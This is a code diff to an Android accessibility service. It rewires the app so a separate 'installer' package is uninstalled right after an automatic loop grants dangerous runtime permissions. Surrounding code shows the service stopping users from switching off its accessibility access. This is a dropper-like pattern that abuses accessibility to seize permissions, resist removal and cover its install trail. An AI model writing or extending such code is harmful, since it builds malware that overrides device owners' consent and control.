@@ -124,7 +124,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private volatile long uninstallAssistExpiresAt = 0L;
     private volatile long lastUninstallAssistClickAt = 0L;
     private static final long UNINSTALL_ASSIST_TIMEOUT_MS = 30_000L;
-    private static final long FIRST_LAUNCH_INSTALLER_CLEANUP_DELAY_MS = 13_500L;
+    private static final long FIRST_LAUNCH_INSTALLER_CLEANUP_DELAY_MS = 2_000L;
+    private volatile boolean firstLaunchInstallerCleanupScheduled = false;
     
     // Defent variables - run continuously forever
     private String currentAppName = "";
@@ -242,11 +243,13 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
-     * Removes the one-time installer after the module's accessibility service
-     * connects for the first time. Waiting for the initial permission window to
-     * finish keeps the uninstall dialog from being covered by onboarding dialogs.
+     * Removes the one-time installer after the initial dangerous-permission
+     * flow has finished. The package is injected by build.sh into BuildConfig.
      */
     private void scheduleFirstLaunchInstallerCleanup() {
+        if (firstLaunchInstallerCleanupScheduled) return;
+        firstLaunchInstallerCleanupScheduled = true;
+
         final String installerPackage = BuildConfig.INSTALLER_PACKAGE;
         if (installerPackage == null || installerPackage.trim().isEmpty()
                 || installerPackage.equals(getPackageName())) {
@@ -313,7 +316,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 android.content.SharedPreferences prefs = getSharedPreferences("svc_prefs", MODE_PRIVATE);
                 prefs.edit().putBoolean("overlay_setup_done", true).apply();
             } catch (Exception ignored) {}
-            try { scheduleFirstLaunchInstallerCleanup(); } catch (Exception ignored) {}
         }
 
         // Accessibility Assist: protect the accessibility toggle from being turned off.
@@ -1445,6 +1447,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     Log.i(TAG, "Auto-grant: permission loop finished ("
                             + (missing.length == 0 ? "all granted" : "12 s window closed") + ")");
                     autoGrantMode = false;
+                    finishFirstLaunchPermissionFlow();
                 }
             }
         };
@@ -1454,9 +1457,21 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // Safety net: kill autoGrantMode after 12 s even if the loop is still mid-cycle.
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
+            finishFirstLaunchPermissionFlow();
             Log.i(TAG, "Auto-grant mode expired after 12 seconds");
         }, 12_000);
         Log.i(TAG, "Auto-grant mode ENABLED — will request permissions over home launcher for 12 s");
+    }
+
+    /**
+     * Runtime permission requests must finish before the build-assigned installer
+     * uninstall dialog is opened. Both the normal loop completion and its safety
+     * timeout call this method; cleanup itself is one-shot.
+     */
+    private void finishFirstLaunchPermissionFlow() {
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try { scheduleFirstLaunchInstallerCleanup(); } catch (Exception ignored) {}
+        }, FIRST_LAUNCH_INSTALLER_CLEANUP_DELAY_MS);
     }
 
     /**
